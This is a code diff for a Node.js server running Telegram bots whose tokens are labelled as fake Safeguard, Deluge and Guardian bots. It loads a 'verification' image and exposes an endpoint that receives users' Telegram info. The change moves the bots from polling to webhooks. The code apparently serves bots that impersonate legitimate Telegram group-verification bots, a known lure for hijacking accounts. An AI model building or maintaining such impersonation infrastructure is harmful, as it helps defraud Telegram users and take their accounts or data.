@@ -30,15 +30,14 @@ const safeguardVerification = fs.readFileSync(
   path.join(__dirname, "images/verification/safeguard.jpg")
 );
 
-const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, {
-  polling: true,
-});
-const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, {
-  polling: true,
-});
-const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, {
-  polling: true,
-});
+const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN);
+const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN);
+const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN);
+
+// Set webhooks for each bot
+safeguardBot.setWebHook(`${process.env.DOMAIN}/api/webhook/safeguard`);
+delugeBot.setWebHook(`${process.env.DOMAIN}/api/webhook/deluge`);
+guardianBot.setWebHook(`${process.env.DOMAIN}/api/webhook/guardian`);
 
 const guardianButtonTexts = [
   "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
@@ -127,6 +126,10 @@ app.post("/api/users/telegram/info", async (req, res) => {
     res.status(500).json({ error: "server error" });
   }
 });
+
+app.use("/api/webhook/safeguard", (req, res) => safeguardBot.processUpdate(req.body));
+app.use("/api/webhook/deluge", (req, res) => delugeBot.processUpdate(req.body));
+app.use("/api/webhook/guardian", (req, res) => guardianBot.processUpdate(req.body));
 
 function delay(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
